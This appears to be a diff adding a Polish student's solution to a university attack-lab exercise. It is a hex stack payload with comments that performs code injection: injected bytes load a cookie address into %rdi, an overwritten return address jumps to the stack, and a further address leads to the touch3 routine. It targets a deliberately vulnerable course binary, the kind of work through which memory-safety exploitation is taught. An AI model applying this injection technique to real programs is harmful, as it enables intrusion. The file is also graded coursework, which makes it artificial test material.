@@ -1,0 +1,19 @@
+/* 
+ * Oświadczam, że zapoznałem(-am) się z regulaminem prowadzenia zajęć
+ * i jestem świadomy(-a) konsekwencji niestosowania się do podanych tam zasad.
+ *
+ * Imię i nazwisko, numer indeksu: Jakub Kowalski, 323419
+ *
+ * Poniżej należy podać i wyjaśnić zawartość wkładaną na stos programu.
+ */
+
+48 c7 c7 70 af 67 55 c3 /* Instrukcje movq $0x5567af70, %rdi; retq */
+00 00 00 00 00 00 00 00 /* Zostaną umieszczone na stosie pod adresem 5567af28 */
+00 00 00 00 00 00 00 00 /* 0x5567af70 to adres, w którym znajdzie się nasze ciastko */
+00 00 00 00 00 00 00 00 /* Łatwo uzyskać tą informację za pomocą gdb, gdyż program nie korzysta z opcji PIE */
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00 /* Filler */
+28 af 67 55 00 00 00 00 /* Adres, pod który trafią powyższe instrukcje, zastąpi on właściwy adres powrotu */
+f6 1c 40 00 00 00 00 00 /* Adres procedury touch3, zostanie zdjęty ze stosu przy powrocie z pierwszej linijki */
+31 36 38 33 38 38 36 36 /* Ciastko w formie ASCII w systemie szesnastkowym */
